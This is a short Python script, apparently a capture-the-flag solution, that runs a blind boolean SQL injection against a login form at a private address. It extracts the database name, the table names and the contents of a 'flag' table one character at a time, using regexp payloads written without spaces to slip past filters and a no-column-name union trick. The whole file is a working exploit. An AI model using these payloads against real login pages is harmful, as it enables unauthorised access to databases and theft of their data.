import requests
import time

url="http://10.212.27.23:8749/login.php"
lists = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ}{,-."

def exp(payload, len):
	info=''
	for i in range(1,len):
		for c in lists:
			payload2 = payload % ((info+c).encode().hex())
			resp=requests.post(url,data={'username':payload2,'password':'1'})
			# print(resp.text)
			if('home' in resp.text):
				info+=c
				print(info)
				break
	print()

# 库名
payload='"||(select(database()))regexp(0x5e%s)||"'
payload='"||(select(database()))regexp(0x5e%s)#'
exp(payload,5)

# 表名
payload='"||(select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)regexp(database())))regexp(0x5e%s)||"'
payload='"||(select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)regexp(database())))regexp(0x5e%s)#'
exp(payload, 10)

# flag(无列名注入)
payload='"union(select(b),(2)from(((select(1)b)union(select\n*\nfrom(f1ag)))a)where(b)regexp(0x5e66%s))#'
payload='"||(select(group_concat(b))from((select(1)b)union(select\n*\nfrom(f1ag)))a)regexp(0x5e%s)#'
payload='"||(select\n*\nfrom(f1ag))regexp(0x5e%s)#' # 只有表f1ag列数为1时才能使用
exp(payload, 50)
